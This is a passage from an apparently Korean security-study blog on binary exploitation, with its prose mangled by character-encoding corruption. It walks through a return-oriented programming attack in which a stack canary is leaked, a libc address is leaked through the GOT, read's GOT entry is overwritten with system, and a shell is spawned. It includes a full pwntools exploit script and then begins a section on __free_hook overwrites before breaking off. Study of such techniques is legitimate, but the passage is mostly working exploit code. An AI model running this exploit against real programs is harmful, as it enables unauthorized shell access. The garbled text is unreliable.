</code></pre></li><li><p>ì´ì œ read í•¨ìˆ˜ì˜ ì£¼ì†Œë¥¼ í™•ì¸í•´ì•¼ í•œë‹¤. í•˜ì§€ë§Œ pwntoolì—ì„œëŠ” read í•¨ìˆ˜ì˜ ì£¼ì†Œê°€ ì €ì¥ëœ got í…Œì´ë¸”ì˜ ì£¼ì†ŒëŠ” í™•ì¸í•  ìˆ˜ ìˆì§€ë§Œ, ê·¸ ì•ˆì— ì €ì¥ëœ ê°’(read í•¨ìˆ˜ì˜ ë©”ëª¨ë¦¬ìƒ ì£¼ì†Œ)ì€ í™•ì¸í•  ìˆ˜ ì—†ë‹¤.</p></li><li><p>read í•¨ìˆ˜ì˜ ë©”ëª¨ë¦¬ìƒ ì£¼ì†Œê°’ì„ í™•ì¸í•˜ë ¤ë©´ í”„ë¡œê·¸ë¨ì—ì„œ got ê°’ì„ ì¶œë ¥í•˜ë„ë¡ exploit codeë¥¼ ì‘ì„±í•´ì•¼ í•œë‹¤.</p></li><li><p>buffer overflowë¥¼ í†µí•´ <code>write(1,read_got)</code> ë¥¼ í˜¸ì¶œí•˜ë©´ ì›í•˜ëŠ” ê°’ì„ ì¶œë ¥í•  ìˆ˜ ìˆë‹¤.</p></li><li><p>rdi(ì²«ë²ˆì§¸ ì¸ì)ë¥¼ 1, rsi(ë‘ë²ˆì§¸ ì¸ì)ë¥¼ read_gotë¡œ ì„¤ì •í•˜ê¸° ìœ„í•´ <code>return gadget</code> ì„ ì‚¬ìš©í•œë‹¤.</p></li><li><p><code>ROPgadget --binary PROGRAM_PATH</code> ë¡œ ê²€ìƒ‰ í•˜ì—¬ <code>pop rsi</code> ì™€ <code>pop rdi</code> gadget ì„ ì°¾ëŠ”ë‹¤.</p><ul><li><a href=../../systemhacking/pwntool/#ropgadget>ROPgadget ì‚¬ìš©ë²• ì°¸ì¡°</a></li></ul><pre tabindex=0><code>0x0000000000400851 : pop rsi ; pop r15 ; ret
0x0000000000400853 : pop rdi ; ret
# ê²€ìƒ‰ ê²°ê³¼ pop rdi / pop rsi êµ¬ë¬¸ì´ í¬í•¨ëœ ë‹¤ë¥¸ gadget ì´ ì—†ìœ¼ë¯€ë¡œ ì„ íƒì§€ëŠ” ì—†ë‹¤.
# gadget ì˜ ì£¼ì†ŒëŠ” ë™ì¼í•œ í”„ë¡œê·¸ë¨ ì‹¤í–‰ì‹œ í•­ìƒ ì¼ì •í•œ ê°’ì„ ê°€ì§€ë¯€ë¡œ ë¯¸ë¦¬ ì¶”ì¶œí•˜ì—¬ ì‚¬ìš©í•  ìˆ˜ ìˆë‹¤.
</code></pre></li><li><p>exploit ì½”ë“œë¥¼ ì‘ì„±í•œë‹¤.</p><pre tabindex=0><code>from pwn import *

p = process(PROGRAMA_PATH)
e = ELF(PROGRAMA_PATH)

# exploit code, ì½”ë“œìƒ buffer overflowë¥¼ ë°œìƒì‹œí‚¬ ìˆ˜ ìˆëŠ” êµ¬ë¬¸ì´ ìˆë‹¤ê³  ê°€ì •í•œë‹¤.
read_plt = e.plt[&#39;read&#39;]  # read í•¨ìˆ˜ì˜ plt
read_got = e.got[&#39;read&#39;]  # read í•¨ìˆ˜ì˜ got
write_plt = e.plt[&#39;write&#39;]  # write í•¨ìˆ˜ì˜ plt
pop_rdi_ret = 0x0000000000400853  # pop rdi; ret êµ¬ë¬¸ì˜ ì£¼ì†Œ
pop_rsi_pop_r15_ret = 0x0000000000400851  # pop rsi; pop r15; ret êµ¬ë¬¸ì˜ ì£¼ì†Œ

payload = b&#39;A&#39;*(buffer_length + 8) + canary + b&#39;B&#39;*8  # overwrite buffer_length + 8(canary_dummy) + canary(8) + SFP(8)
payload += p64(pop_rdi_ret) + p64(1)  # rdi ì— 1 ì„ ì ìš©í•˜ë„ë¡ gadget ë°°ì¹˜
payload += p64(pop_rsi_pop_r15_ret) + p64(read_got) + p64(0)  # rsi ì— read_got ì„ ë„£ê³ , r15ì— 0(ì•„ë¬´ê°’) ì„ ë„£ëŠ”ë‹¤.
payload += p64(write_plt)  # return ì£¼ì†Œë¥¼ write_plt ë¡œ ë³€ê²½í•œë‹¤. 
# write(1,read_got) ê°€ ì™„ì„±ë˜ì—ˆë‹¤. ê²°ê³¼ë¡œ read í•¨ìˆ˜ì˜ ì£¼ì†Œë¥¼ ì¶œë ¥í•œë‹¤.
</code></pre></li><li><p>ì¶œë ¥ëœ ê°’ì—ì„œ read í•¨ìˆ˜ì˜ offset (ì•ì„œ êµ¬í•œ offset_read) ì„ ë¹¼ë©´ libc_base ë¥¼ êµ¬í•  ìˆ˜ ìˆë‹¤.</p></li></ul></li></ol></li><li><p>system í•¨ìˆ˜ì˜ offset í™•ì¸</p><ol><li>linux ëª…ë ¹ì–´ ì‚¬ìš©<ul><li><code>readelf -s /lib/x86_64-linux-gnu/libc.so.6</code><pre tabindex=0><code>92: 0000000000083970   448 FUNC    WEAK   DEFAULT   15 gets@@GLIBC_2.2.5
430: 0000000000084420   476 FUNC    WEAK   DEFAULT   15 puts@@GLIBC_2.2.5
639: 0000000000061c90   204 FUNC    GLOBAL DEFAULT   15 printf@@GLIBC_2.2.5
942: 000000000010e1e0   153 FUNC    GLOBAL DEFAULT   15 read@@GLIBC_2.2.5
1430: 0000000000052290    45 FUNC    WEAK   DEFAULT   15 system@@GLIBC_2.2.5
</code></pre></li><li>system í•¨ìˆ˜ì˜ offsetì€ <code>0x0000000000052290</code></li></ul></li><li>pwntool ì‚¬ìš©<ul><li>ELF í•¨ìˆ˜ë¡œ ELF íŒŒì¼ì„ ì½ê³  í•„ìš”í•œ í•¨ìˆ˜ì˜ symbolì„ ì°¸ì¡°í•œë‹¤.<pre tabindex=0><code>libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)
offset_system = libc.symbols[&#39;system&#39;]
print(offset_system)
</code></pre></li></ul></li></ol></li></ol><ul><li>1,2ì—ì„œ ë‚˜ì˜¨ ê²°ê³¼ë¥¼ ì¢…í•©í•˜ì—¬, libc_base ì— system í•¨ìˆ˜ì˜ offsetì„ ë”í•œ ê²°ê³¼ê°€ &ldquo;ì‹¤í–‰ëœ í”„ë¡œê·¸ë¨ì˜ ë©”ëª¨ë¦¬ì— ì ì¬ëœ system í•¨ìˆ˜ì˜ ì£¼ì†Œ&rdquo; ê°’ì´ë‹¤.</li><li>libc ì˜ ì¼ë¶€ í•¨ìˆ˜ì˜ ì£¼ì†Œë¥¼ ì…ë ¥í•˜ë©´ libc ë²„ì „ ë° ë‹¤ë¥¸ í•¨ìˆ˜ì˜ ì£¼ì†Œë„ í™•ì¸í•  ìˆ˜ ìˆëŠ” ì‚¬ì´íŠ¸ê°€ ìˆë‹¤.<ul><li><a href=https://libc.rip/>ì‚¬ì´íŠ¸ ë§í¬</a></li></ul></li></ul></li><li><p>&ldquo;/bin/sh&rdquo; ë¬¸ìì—´ì˜ ìœ„ì¹˜ë¥¼ ì°¾ëŠ”ë‹¤. (ìƒëµ ê°€ëŠ¥)</p><ul><li>&ldquo;/bin/sh&rdquo; ë¬¸ìì—´ì„ lib.so.6 íŒŒì¼ì—ì„œ ì°¾ì„ ìˆ˜ ìˆì§€ë§Œ, writing ê°€ëŠ¥í•œ ë²„í¼ì— ì§ì ‘ ë¬¸ìì—´ì„ ì…ë ¥í•˜ëŠ” ë°©ë²•ë„ ìˆë‹¤. í›„ìì˜ ê²½ìš° êµ³ì´ &ldquo;/bin/sh&rdquo; ë¥¼ ì°¾ì„ í•„ìš”ê°€ ì—†ë‹¤.</li><li>libc.so.6 ì— í¬í•¨ëœ &ldquo;/bin/sh&rdquo; ë¬¸ìì—´ì˜ ì£¼ì†Œë¥¼ ì°¾ìœ¼ë ¤ë©´, system() í•¨ìˆ˜ì˜ ì£¼ì†Œë¥¼ ì°¾ì„ ë•Œì™€ ë§ˆì°¬ê°€ì§€ë¡œ <code>/bin/sh</code> ë¬¸ìì—´ì˜ offset ì— libc_base ì£¼ì†Œë¥¼ ë”í•˜ì—¬ ì°¸ì¡°í•  ìˆ˜ ìˆë‹¤.</li></ul><ol><li><p>gdb ì‚¬ìš©</p><ul><li><code>gdb</code> ë¥¼ ì‚¬ìš©í•˜ë©´ offsetì´ ì•„ë‹Œ ì‹¤ì œ ì£¼ì†Œë¥¼ í™•ì¸í•  ìˆ˜ ìˆë‹¤. <code>search /bin/sh</code> ëª…ë ¹ìœ¼ë¡œ /bin/sh ì˜ &ldquo;ë©”ëª¨ë¦¬ìƒ ì£¼ì†Œ&rdquo; ê°€ ì¶œë ¥ëœë‹¤.<ul><li>ex)<pre tabindex=0><code>pwndbg&gt; search /bin/sh
Searching for value: &#39;/bin/sh&#39;
libc-2.31.so    0x7ffff7f7f5bd 0x68732f6e69622f /* &#39;/bin/sh&#39; */

# /bin/sh ì˜ ì£¼ì†Œ(0x7ffff7f7f5bd) ì—ì„œ libc_base ë¥¼ ëº€ ê°’ì´ /bin/sh ì˜ offsetì´ ëœë‹¤.
</code></pre></li></ul></li></ul></li><li><p>linux ëª…ë ¹ì–´ ì‚¬ìš©</p><ul><li>linuxì˜ <code>strings</code> ëª…ë ¹ì„ ì´ìš©í•œë‹¤.</li><li><code>strings -tx /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh</code> ëª…ë ¹ ê²°ê³¼ <code>1b45bd /bin/sh</code> ê°€ í™•ì¸ëœë‹¤.</li></ul></li><li><p>pwntool ì‚¬ìš©</p></li></ol><ul><li>ELF íŒŒì¼ì„ ë¶„ì„í•˜ì—¬ ë‚˜ì˜¨ ê²°ê³¼ì— libc_base ë¥¼ ë”í•˜ë©´ ì‹¤ì œ ë©”ëª¨ë¦¬ ì£¼ì†Œê°€ ë‚˜ì˜¨ë‹¤.</li><li>ex)<pre tabindex=0><code>from pwn import *
libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)

# /bin/sh offset í™•ì¸
bin_sh1 = list(libc.search(b&#39;/bin/sh&#39;))[0]  # ë°©ë²•1
bin_sh2 = next(libc.search(b&#39;/bin/sh&#39;))  # ë°©ë²•2
# -&gt; /bin/sh/ ì˜ ë©”ëª¨ë¦¬ìƒ ì£¼ì†Œ == libc_base + bin_sh1 ì´ë‹¤.
</code></pre></li></ul></li><li><p>system("/bin/bash") ë¥¼ ì‘ì„±í•œë‹¤.</p><ul><li>read í•¨ìˆ˜ì˜ got ì— system í•¨ìˆ˜ì˜ ì£¼ì†Œë¥¼ ë„£ìœ¼ë©´, ì½”ë“œìƒ read("/bin/bash") ê°€ ì‹¤ì œë¡œëŠ” system("/bin/bash") ë¡œ ë™ì‘í•˜ê²Œ ëœë‹¤.</li><li>ì´ë¥¼ ì´ìš©í•´ got ì˜ì—­ì„ ì¡°ì‘í•˜ì—¬ system í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•œë‹¤.</li></ul><ol><li>pwntool ì‚¬ìš©<ul><li>ë¦¬ëˆ…ìŠ¤ì—ì„œ <code>ROPgadget --binary rop</code> ëª…ë ¹ìœ¼ë¡œ ë°”ì´ë„ˆë¦¬ë¥¼ ë¶„ì„í•˜ë©´, return gadget ë“¤ì´ í™•ì¸ëœë‹¤. ì´ì¤‘ rdi, rsi ê°€ í¬í•¨ëœ gadgetë“¤ì„ í™•ì¸í•œë‹¤. (ì´í•˜ rdi_ret, rsi_ret)</li><li>rdi_ret, rsi_ret ì„ í™œìš©í•˜ì—¬ rdi() ì™€ rsi ê°’ì„ ì•Œë§ê²Œ ì„¤ì • í•´ ì£¼ê³ , ì›í•˜ëŠ” í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•œë‹¤..</li><li>gadgetë“¤ì€ íŠ¹ì • í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ëŠ” ê²ƒì´ ì•„ë‹ˆê¸° ë•Œë¬¸ì— ë™ì¼í•œ stack frame ì•ˆì—ì„œ í˜¸ì¶œë˜ë¯€ë¡œ canary ë¥¼ ì„¸íŒ… í•´ ì¤„ í•„ìš”ëŠ” ì—†ë‹¤.</li><li>ì½”ë“œìƒìœ¼ë¡œëŠ” ë‹¤ìŒê³¼ ê°™ë‹¤.<pre tabindex=0><code># (2) ì—ì„œ libc_base ë¥¼ ì•Œì•„ë‚´ê¸° ìœ„í•´ buffer overflow ë¡œ read í•¨ìˆ˜ì˜ got ì˜ì—­ì„ ì¶œë ¥í•˜ë„ë¡ payloadë¥¼ ì‘ì„±í–ˆë‹¤.
# ì—¬ê¸°ì— system(&#34;/bin/sh&#34;) ë¥¼ í˜¸ì¶œí•˜ê¸° ìœ„í•œ ì½”ë“œë¥¼ ì´ì–´ì„œ ì‘ì„±í•œë‹¤.
# read_got ì— system í•¨ìˆ˜ì˜ ì£¼ì†Œë¥¼ ë®ì–´ì“°ê¸° ìœ„í•´ read í•¨ìˆ˜ë¥¼ í•œ ë²ˆ ë” í˜¸ì¶œí•œë‹¤.
# read(0, read_got, arg3) ë¥¼ í˜¸ì¶œí•˜ì—¬ ì…ë ¥ì„ í•œ ë²ˆ ë” ë°›ë„ë¡ í•œë‹¤.
# arg3, ì¦‰ rdx ì— 6 ì´ìƒì˜ ê°’ì´ ë“¤ì–´ê°€ì•¼ í•˜ì§€ë§Œ, ROPgadget ëª…ë ¹ìœ¼ë¡œ í™•ì¸ ê²°ê³¼ rdx ê°€ í¬í•¨ëœ gadgetì´ ì—†ë‹¤ë©´ ìš´ì— ë§¡ê¸°ê³  í˜¸ì¶œí•œë‹¤.
payload += p64(pop_rdi_ret) + p64(0)  # rdi ì— 0 ê°’ ì ìš©
payload += p64(pop_rsi_pop_r15_ret) + p64(read_got) + p64(0)  # rsi ì— read_got ì£¼ì†Œ ì ìš©, r15 popì„ ìœ„í•œ ë”ë¯¸ê°’ 0 ì ìš©
# read í•¨ìˆ˜ì˜ plt ë¥¼ í˜¸ì¶œí•˜ë©´ system í•¨ìˆ˜ê°€ í˜¸ì¶œë˜ë„ë¡ gotë¥¼ ë³€ê²½í•œë‹¤.
# e = ELF(PROGRAM_PATH)
# read_plt = e.plt[&#39;read&#39;]
payload += p64(read_plt)  # read í•¨ìˆ˜ í˜¸ì¶œ

# readì˜ gotë¥¼ systemìœ¼ë¡œ ë³€ê²½í•˜ê²Œ ë˜ë©´, read(&#34;/bin/bash&#34;) ë¥¼ í˜¸ì¶œí•œ ê²°ê³¼ëŠ” system(&#34;/bin/bash&#34;) ê°€ ëœë‹¤.  
payload += p64(pop_rdi_ret) + p64(addr_bin_sh)
payload += p64(read_plt)
</code></pre></li></ul></li></ol></li></ol><ul><li>ì •ë¦¬í•˜ìë©´ ì•„ë˜ì™€ ê°™ë‹¤.<ul><li>ì „ì œì¡°ê±´ :<ul><li><ol><li>buffer overflow 2íšŒ ì´ìƒ</li></ol></li><li><ol start=2><li>ë°”ì´ë„ˆë¦¬ ë³´ìœ </li></ol></li></ul></li><li>ìˆœì„œ:<ul><li><ol><li>canary íšë“</li></ol></li><li><ol start=2><li>exploit ìš© payload ì‘ì„±</li></ol><ul><li>ë°”ì´ë„ˆë¦¬ë¥¼ <code>ROPgadget --binary rop</code> ë¡œ ë¶„ì„í•˜ì—¬ return gadget ì¶”ì¶œ</li><li><code>write(1, read_got, ?)</code> í•¨ìˆ˜ë¥¼ return gadget ìœ¼ë¡œ ì‘ì„±í•˜ì—¬ read í•¨ìˆ˜(ë‹¤ë¥¸ í•¨ìˆ˜ë„ ê°€ëŠ¥) ì˜ got ì£¼ì†Œ ì¶œë ¥ ìœ ë„</li><li><code>read(0, read_got, ?)</code> í•¨ìˆ˜ë¥¼ return gadget ìœ¼ë¡œ ì‘ì„±í•˜ì—¬ read í•¨ìˆ˜ì˜ got ì˜ì—­ ê°’ ë®ì–´ì“°ë„ë¡ í•˜ê¸°<ul><li><code>read(read_got + 8)</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œ. read í•¨ìˆ˜ì˜ got ë¥¼ system í•¨ìˆ˜ì˜ ì£¼ì†Œë¡œ ë³€ê²½í•˜ê³ , <code>read_got + 8</code> ì— <code>"/bin/sh"</code> ë¥¼ ë„£ì„ ì˜ˆì •ì´ê¸° ë•Œë¬¸ì—, ì´ êµ¬ë¬¸ì€ <code>system("/bin/sh")</code> ê°€ ë  ì˜ˆì •</li></ul></li></ul></li><li><ol start=3><li>payloadë¥¼ í”„ë¡œê·¸ë¨ì— ì „ë‹¬í•˜ì—¬ ì¶œë ¥ëœ read í•¨ìˆ˜ì˜ ì£¼ì†Œë¥¼ íšë“, íšë“í•œ ì£¼ì†Œì—ì„œ read í•¨ìˆ˜ì˜ offset ì„ ë¹¼ì„œ libc_base ê³„ì‚°</li></ol></li><li><ol start=4><li>libc_base ì— system í•¨ìˆ˜ì˜ offset ì„ ë”í•´ì„œ system í•¨ìˆ˜ì˜ ì£¼ì†Œ ê³„ì‚°</li></ol></li><li><ol start=5><li>system í•¨ìˆ˜ì˜ ì£¼ì†Œ(8byte) + &ldquo;/bin/sh&rdquo;(8byte) ì˜ payload ë¥¼ ì‘ì„±í•˜ì—¬ í”„ë¡œê·¸ë¨ì— ì „ë‹¬</li></ol><ul><li>ì•ì„œ ì‘ì„±í•œ <code>read(0, read_got, ?)</code> í•¨ìˆ˜ì—ì„œ ì´ë¥¼ ìˆ˜ì‹ í•¨</li></ul></li><li>ê·¸ ê²°ê³¼ í”„ë¡œê·¸ë¨ì—ì„œ <code>read(read_got + 8)</code> ëŠ” <code>system("/bin/sh")</code> ë¡œ ë³€ê²½ë˜ê³ , ì‰˜ ê¶Œí•œì„ íšë“í•˜ê²Œ ë¨</li></ul></li></ul></li><li>ì „ì²´ ì½”ë“œëŠ” ë‹¤ìŒê³¼ ê°™ë‹¤.</li></ul><pre tabindex=0><code>from pwn import *

##########
# RUN PROGRAM
##########
p = process(PROGRAM_PATH)
e = ELF(PROGRAM_PATH)
libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)

# íŠ¹ì • libc íŒŒì¼ì„ ì ìš©í•˜ê³  ì‹¶ì„ ë•Œ
# p = process(&#39;PROGRAM_PATH&#39;, env= {&#34;LD_PRELOAD&#34; : &#34;./libc.so.6&#34;})
# libc = ELF(&#39;./libc.so.6&#39;)

buffer_length = 0x30  # exploit í•  ì½”ë“œì— ë”°ë¼ ë³€ê²½ í•„ìš”

##########
# LEAK CANARY
##########
payload = b&#39;A&#39;*(buffer_length + 8 + 1) # overwrite buffer_length + 8(other local variable) + 1(canary_first 1 byte null)
# p.sendafter(b&#39;Buf: &#39;, payload)
p.send(payload)
p.recvuntil(payload)
canary = b&#39;\x00&#39; + p.recvn(7)
print(&#39;canary:&#39;,hex(u64(canary)))

##########
# LEAK ADDRESS OF LIBC FUNC
##########
read_got = e.got[&#39;read&#39;]  # read í•¨ìˆ˜ì˜ got
read_plt = e.plt[&#39;read&#39;]  # read í•¨ìˆ˜ì˜ plt
write_plt = e.plt[&#39;write&#39;]  # write í•¨ìˆ˜ì˜ plt
pop_rdi_ret = 0x0000000000400853  # pop rdi; ret êµ¬ë¬¸ì˜ ì£¼ì†Œ
pop_rsi_pop_r15_ret = 0x0000000000400851  # pop rsi; pop r15; ret êµ¬ë¬¸ì˜ ì£¼ì†Œ
ret = 0x0000000000400596  # ret êµ¬ë¬¸ì˜ ì£¼ì†Œ, ë¦¬í„´ ê°€ì ¯

payload = b&#39;A&#39;*(buffer_length + 8) + canary + b&#39;B&#39;*8  # overwrite buffer_length + 8(other local variable) + canary(8) + SFP(8)
payload += p64(pop_rdi_ret) + p64(1)  # rdi ì— 1 ì„ ì ìš©í•˜ë„ë¡ gadget ë°°ì¹˜
payload += p64(pop_rsi_pop_r15_ret) + p64(read_got) + p64(0)  # rsi ì— read_got ì„ ë„£ê³ , r15ì— 0(ì•„ë¬´ê°’) ì„ ë„£ëŠ”ë‹¤.
payload += p64(write_plt)  # return ì£¼ì†Œë¥¼ write_plt ë¡œ ë³€ê²½í•œë‹¤.
# write(1,read_got) ê°€ ì™„ì„±ë˜ì—ˆë‹¤. payloadë¥¼ í”„ë¡œê·¸ë¨ì— ë„˜ê¸°ë©´ read í•¨ìˆ˜ì˜ ì£¼ì†Œë¥¼ ì¶œë ¥í•˜ê²Œ ëœë‹¤.

##########
# CHANGE GOT OF READ INTO ADDR OF SYSTEM
##########
# ì•ì„œ libc_baseë¥¼ ì•Œì•„ë‚´ê¸° ìœ„í•´ buffer overflowë¡œ read í•¨ìˆ˜ì˜ got ì˜ì—­ì„ ì¶œë ¥í•˜ë„ë¡ payloadë¥¼ ì‘ì„±í–ˆë‹¤.
# payloadì— system(&#34;/bin/sh&#34;) ë¥¼ í˜¸ì¶œí•˜ê¸° ìœ„í•œ ì½”ë“œë¥¼ ì´ì–´ì„œ ì‘ì„±í•œë‹¤.
# read_got ì— system í•¨ìˆ˜ì˜ ì£¼ì†Œë¥¼ ë®ì–´ì“°ê¸° ìœ„í•´ read í•¨ìˆ˜ë¥¼ í•œ ë²ˆ ë” í˜¸ì¶œí•œë‹¤.
# read(0, read_got, arg3) ë¥¼ í˜¸ì¶œí•˜ì—¬ ì…ë ¥ì„ í•œ ë²ˆ ë” ë°›ë„ë¡ í•œë‹¤.
# arg3, ì¦‰ rdx ì— 6 ì´ìƒì˜ ê°’ì´ ë“¤ì–´ê°€ì•¼ í•˜ì§€ë§Œ, ROPgadget ëª…ë ¹ìœ¼ë¡œ í™•ì¸ ê²°ê³¼ rdx ê°€ í¬í•¨ëœ gadgetì´ ì—†ë‹¤ë©´ ìš´ì— ë§¡ê¸°ê³  í˜¸ì¶œí•œë‹¤.
payload += p64(pop_rdi_ret) + p64(0)  # rdi ì— 0 ê°’ ì ìš©
payload += p64(pop_rsi_pop_r15_ret) + p64(read_got) + p64(0)  # rsi ì— read_got ì£¼ì†Œ ì ìš©, r15 popì„ ìœ„í•œ ë”ë¯¸ê°’ 0 ì ìš©
# read í•¨ìˆ˜ì˜ plt ë¥¼ í˜¸ì¶œí•˜ë©´ system í•¨ìˆ˜ê°€ í˜¸ì¶œë˜ë„ë¡ gotë¥¼ ë³€ê²½í•œë‹¤.
payload += p64(read_plt)  # read í•¨ìˆ˜ í˜¸ì¶œ

# ì°¸ì¡°
offset_bin_sh = next(libc.search(b&#39;/bin/sh&#39;))  # libcì— ìœ„ì¹˜í•œ &#34;/bin/sh&#34; ë¬¸ìì—´ì˜ ìœ„ì¹˜ë¥¼ ì¶”ì¶œí•  ìˆ˜ ìˆë‹¤.
print(&#39;offset /bin/sh:&#39;, hex(offset_bin_sh))

##########
# CALL read(&#34;/bin/bash&#34;)
##########
# readì˜ gotë¥¼ systemìœ¼ë¡œ ë³€ê²½í•˜ê²Œ ë˜ë©´, read(&#34;/bin/bash&#34;) ë¥¼ í˜¸ì¶œí•œ ê²°ê³¼ëŠ” system(&#34;/bin/bash&#34;) ê°€ ëœë‹¤.
payload += p64(pop_rdi_ret) + p64(read_got + 0x08)  # &#34;/bin/bash&#34; ë¬¸ìì—´ì„ libcì—ì„œ ì‚¬ìš©í•˜ì§€ ì•Šê³  got ì˜ì—­ì— ë®ì–´ì¨ì„œ ì‚¬ìš©í•˜ê² ë‹¤.
payload += p64(ret)  # system() í•¨ìˆ˜ ë‚´ë¶€ì˜ movaps ê°€ ìŠ¤íƒì˜ ë°ì´í„°ë¥¼ 16ë°”ì´íŠ¸ë¡œ ì •ë ¬í•˜ë¯€ë¡œ, 16ë°”ì´íŠ¸ ì§ì„ ë§ì¶”ê¸° ìœ„í•´ ë¦¬í„´ê°€ì ¯ ì‚¬ìš©
payload += p64(read_plt)


# payload ë³´ë‚´ê²Œ ë˜ë©´ (1) read í•¨ìˆ˜ ì£¼ì†Œ ì¶œë ¥, (2) stdin ì…ë ¥ ëŒ€ê¸°, ì…ë ¥ëœ ê°’ìœ¼ë¡œ read_got ë®ì–´ì”€, (3) system(&#39;/bin/sh&#39;) ì‹¤í–‰
p.sendafter(b&#39;Buf: &#39;, payload)
addr_read = p.recvn(6).ljust(8,b&#39;\x00&#39;)  # ASLRì´ ì ìš©ë˜ë©´ ë¼ì´ë¸ŒëŸ¬ë¦¬ í•¨ìˆ˜ì˜ ì£¼ì†ŒëŠ” í•­ìƒ 0x00007f ë¡œ ì‹œì‘í•˜ë¯€ë¡œ 0x00 0x00 + 6ìë¦¬ë¡œ êµ¬ì„±ëœë‹¤.
print(&#39;addr read:&#39;, hex(u64(addr_read)))

##########
# CALC LIBC_BASE ADDR
##########
# ìœ ì¶œëœ read í•¨ìˆ˜ì˜ ì£¼ì†Œë¡œ libc_base ê°€ ë©”ëª¨ë¦¬ìƒì— ìœ„ì¹˜í•˜ëŠ” ì£¼ì†Œë¥¼ ê³„ì‚°í•œë‹¤.
offset_read = libc.symbols[&#39;read&#39;]
libc_base = u64(addr_read) - offset_read
print(&#39;libc_base:&#39;, hex(libc_base))

##########
# CALC ADDR OF SYSTEM
##########
offset_system = libc.symbols[&#39;system&#39;]
addr_system = libc_base + offset_system
print(&#39;addr system:&#39;, hex(addr_system))

p.send(p64(addr_system) + b&#34;/bin/sh\x00&#34;)

p.interactive()
</code></pre><h3 id=hook-overwrite>Hook Overwrite<a hidden class=anchor aria-hidden=true href=#hook-overwrite>#</a></h3><ul><li>Hooking ì´ë€ ìš´ì˜ ì²´ì œê°€ íŠ¹ì • ì½”ë“œë¥¼ ì‹¤í–‰í•˜ë ¤ í•  ë•Œ ë‹¤ë¥¸ ì½”ë“œê°€ ê°•ì œë¡œ ì‹¤í–‰ë˜ë„ë¡ í•˜ëŠ” ê¸°ëŠ¥ì´ë©°, ì´ë•Œ ì‹¤í–‰ë˜ëŠ” ì½”ë“œë¥¼ <code>Hook</code> ì´ë¼ í•œë‹¤.</li><li>ì‹œìŠ¤í…œ ìƒ ì •ì˜ë˜ì–´ ìˆëŠ” Hook ì„ ì›í•˜ëŠ” í˜•íƒœë¡œ ë®ì–´ì¨ì„œ ìˆ˜í–‰í•˜ëŠ” ê³µê²©ì„ <code>Hook Overwrite</code> ë¼ í•œë‹¤.</li><li>libc.so íŒŒì¼ì˜ malloc ê´€ë ¨ í•¨ìˆ˜ë“¤ì— ë””ë²„ê¹… í¸ì˜ë¥¼ ìœ„í•´ hook ì´ ë¯¸ë¦¬ ì„¤ì •ë˜ì–´ ìˆë‹¤.<ul><li><code>__libc_malloc</code> í•¨ìˆ˜ë¥¼ ì‚´í´ë³´ë©´ <code>__malloc_hook</code> í•¨ìˆ˜ê°€ ìˆìœ¼ë©´ ì´ë¥¼ í˜¸ì¶œí•˜ë„ë¡ ë˜ì–´ ìˆë‹¤.</li><li>free í•¨ìˆ˜ì™€ realloc í•¨ìˆ˜ë“¤ë„ ê°ê° <code>__free_hook</code>, <code>__realloc_hook</code> í•¨ìˆ˜ê°€ hooking ë˜ì–´ìˆë‹¤.</li><li><code>__malloc_hook</code> ëŠ” <code>libc.so</code> ì˜ì—­ ì•ˆì— ìˆìœ¼ë¯€ë¡œ writing ê¶Œí•œì´ ìˆëŠ” ë¼ì´ë¸ŒëŸ¬ë¦¬ ì˜ì—­ì´ë©°, <code>__malloc_hook</code> ì— <code>Hook Overwrite</code> ê³µê²©ì„ ìˆ˜í–‰í•˜ë©´ Full RELRO ê¸°ë²•ìœ¼ë¡œ ë°©ì–´í•  ìˆ˜ ì—†ë‹¤.</li><li><code>readelf -s</code> ëª…ë ¹ìœ¼ë¡œ libc.so íŒŒì¼ì˜ section ì •ë³´ë¥¼ ì¶”ì¶œí•˜ê³ , <code>__malloc_hook</code> í•¨ìˆ˜ì˜ indexë¥¼ ì°¾ëŠ”ë‹¤. ì´í›„ <code>readelf -S</code> í˜¹ì€ <code>objdump -h</code> ëª…ë ¹ìœ¼ë¡œ libc.so íŒŒì¼ì˜ section ë“¤ì„ í™•ì¸í•˜ì—¬ í•´ë‹¹ ë©”ëª¨ë¦¬ ì˜ì—­ì— ì½ê¸°/ì“°ê¸° ê¶Œí•œì´ ìˆëŠ”ì§€ í™•ì¸ í•  ìˆ˜ ìˆë‹¤.<ul><li><code>__malloc_hook</code>, <code>__free_hook</code>, <code>__realloc_hook</code> ê°€ ì €ì¥ë˜ëŠ” ì˜ì—­ì´ bss ì˜ì—­ì¸ linux ë²„ì „ì—ì„œëŠ” Hook Overwriteê°€ ê°€ëŠ¥í•˜ë‹¤.</li><li><code>__free_hook</code> ì´ë‚˜ <code>__malloc_hook</code> ì€ ë³´ì•ˆ ë° ì„±ëŠ¥ ë•Œë¬¸ì— glibc 2.34 ë²„ì „ë¶€í„° ì œê±°ë˜ì—ˆë‹¤.</li></ul></li></ul></li></ul><h4 id=free-hook-overload>Free Hook Overload<a hidden class=anchor aria-hidden=true href=#free-hook-overload>#</a></h4><ul><li><code>free</code> í•¨ìˆ˜ì— ì ìš©ëœ <code>__free_hook</code> ë¥¼ ë®ì–´ì¨ì„œ exploitì„ ìˆ˜í–‰ í•´ ë³¸ë‹¤.</li></ul><ol><li><p>libc_base ì£¼ì†Œ í™•ì¸</p><ul><li>main í•¨ìˆ˜ëŠ” ë³´í†µ <code>__libc_start_main</code> í•¨ìˆ˜ì—ì„œ í˜¸ì¶œë˜ê³ , <code>__libc_start_main</code> í•¨ìˆ˜ì˜ ë©”ëª¨ë¦¬ ì£¼ì†ŒëŠ” <code>libc_base</code> ì´ë‹¤.</li><li>main í•¨ìˆ˜ì˜ ìŠ¤íƒ í”„ë ˆì„ì„ í™•ì¸í•˜ì—¬ return address ë¥¼ ì¶”ì¶œí•œë‹¤. return address ëŠ” __libc_start_main í•¨ìˆ˜ì˜ ì–´ë”˜ê°€ë¥¼ ê°€ë¦¬í‚¬ ê²ƒì´ë‹¤.<ul><li><code>gdb</code> ë¡œ exploit ëŒ€ìƒ í”„ë¡œê·¸ë¨ì„ ë¡œë”©í•˜ê³ , 